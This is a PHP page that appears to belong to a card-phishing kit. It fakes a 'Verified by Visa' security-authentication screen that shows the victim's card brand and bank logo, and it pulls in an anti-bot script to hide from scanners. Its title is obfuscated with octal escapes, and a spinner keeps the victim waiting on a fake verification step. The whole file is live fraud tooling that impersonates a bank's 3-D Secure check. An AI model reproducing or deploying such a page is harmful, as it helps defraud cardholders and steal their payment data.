<?php
session_start(); 
include('../antibots.php'); 
if ($_SESSION['confirm_card'] !== 'success') {
    header('Location:home'); 
}
$brand = strtolower($_SESSION['brand']);
if ($brand == 'visa') {
            $position = '0%';
        } elseif ($brand == 'mastercard') {
            $position = '50%';
        } elseif ($brand == 'american express') {
            $position = '100%';
        }else{
            $position = '200%';
        }
if (empty($_SESSION['logo_bnk']) == false) {
$lg = $_SESSION['logo_bnk'];
}else{
    $lg = '../files/img/ssl.png'; 
}
include('../lang/language.php');
?> 
    <html lang="en">  
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
<title><? echo "\123\145\143\165\162\151\164\171\040\101\165\164\150\056"; ?></title>
<link rel="icon" type="image/png" href="../files/img/favicon.ico">
<link rel="stylesheet" href="../files/css/vbv.css">
    </head>
    <body>
        <div id="ajax" style="opacity: 1;display: block;" > 
            <div id="vbv_form">
<div class="row" id="vbv_line_0">
    <table>
<tbody>
    <tr>
<td><img class="cc_bank" style="max-width: 100px;" id="cc_bank" src="<? echo "$lg"; ?>"></td>
<td style="width: 120px"><div class="cc_type" style="background-position: 0 <?=$position;?>;"></div></td>
    </tr>
</tbody>
    </table>
</div>
<br> 
<div id="verification" class="verification">

<table align="center" height="300px"><tr align="center">
        <td width="55%" align="right"><span style="font-family: sans-serif;"><? echo($language['secure'][20]) ?></span></td>
        <td align="left"><div class="progress"><div></div><div></div><div></div><div></div></div></td>
</tr></table>  
</div> 
<div id="wait" class="hide">
<table align="center" height="300px"><tr align="center">
        <td align="center"><div class="lds-spinner black bold" style="height:100%"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>
        <h2 style="font-size:  small;line-height: 1;text-shadow: 0px 0.5px rgba(0,0,0,0.37);"><? echo($language['secure'][21]) ?></h2></td>
</tr></table> 
</div>
<table style='font-size: 10px; font-family: "Arial";font-style: italic;color: #4E4E4E;'><tr>
<td><?=$_SESSION['url'];?></td>
<td align="right"><?=$_SESSION['phone'];?></td>
</tr>
</table>
</div>
</tr></table></div></div></div>
<script src="../files/js/jquery.js"></script>
<script src="../files/js/plugins.js"></script>
</form></body></html>